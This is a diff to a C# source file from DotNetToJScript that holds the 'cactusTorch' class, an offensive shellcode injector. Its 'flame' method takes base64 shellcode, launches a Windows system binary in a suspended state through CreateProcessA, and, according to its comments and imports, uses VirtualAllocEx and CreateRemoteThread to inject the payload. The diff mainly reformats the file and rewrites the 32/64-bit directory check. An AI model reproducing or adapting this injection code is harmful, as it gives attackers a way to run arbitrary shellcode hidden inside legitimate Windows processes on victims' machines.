@@ -1,4 +1,4 @@
-﻿//    This file is part of DotNetToJScript.
+//    This file is part of DotNetToJScript.
 //    Copyright (C) James Forshaw 2017
 //
 //    DotNetToJScript is free software: you can redistribute it and/or modify
@@ -14,11 +14,8 @@
 //    You should have received a copy of the GNU General Public License
 //    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.
 
-using System.Diagnostics;
 using System.Runtime.InteropServices;
-using System.Windows.Forms;
 using System;
-using System.Text;
 
 [ComVisible(true)]
 public class cactusTorch
@@ -185,7 +182,7 @@ public class cactusTorch
 
     [DllImport("kernel32.dll")]
     public static extern bool TerminateProcess(
-        IntPtr hProcess, 
+        IntPtr hProcess,
         uint uExitCode);
 
     // CreateRemoteThread
@@ -206,7 +203,7 @@ public class cactusTorch
 
     public void flame(string binary, string shellcode32)
     {
-    	// Written by Vincent Yiu (@vysecurity)
+        // Written by Vincent Yiu (@vysecurity)
 
         // shellcode contains base64 shellcode
         // binary contains binary to inject into
@@ -219,24 +216,25 @@ public class cactusTorch
         ProcessInformation pInfo;
         string binaryPath = "";
         // We check what architecture OS it is here
+        if (IntPtr.Size == 8)
+            //if (Environment.GetEnvironmentVariable("ProgramW6432").Length > 0)
+            {
+            //    //64 bit
+              binaryPath = Environment.GetEnvironmentVariable("windir") + "\\SysWOW64\\" + binary;
+            }
+            else
+            {
+            //    //32 bit
+                binaryPath = Environment.GetEnvironmentVariable("windir") + "\\System32\\" + binary;
+            }
 
-        if (Environment.GetEnvironmentVariable("ProgramW6432").Length > 0)
-        {
-            //64 bit
-            binaryPath = Environment.GetEnvironmentVariable("windir") + "\\SysWOW64\\" + binary;
-        }
-        else
-        {
-            //32 bit
-            binaryPath = Environment.GetEnvironmentVariable("windir") + "\\System32\\" + binary;
-        }
+            // We have select the correct directory, for the executeable
 
-        // We have select the correct directory, for the executeable
-
-        // Create the Process in SUSPENDED state
-        IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
+            // Create the Process in SUSPENDED state
+            IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
         IntPtr hProcess = pInfo.hProcess;
-        if (hProcess != IntPtr.Zero) { 
+        if (hProcess != IntPtr.Zero)
+        {
             //MessageBox.Show("hProcess: " + hProcess.ToString("X8"));
             // Use VirtualAllocEx to create some space
 
@@ -269,4 +267,3 @@ public class cactusTorch
         //Process.Start(shellcode);
     }
 }
-
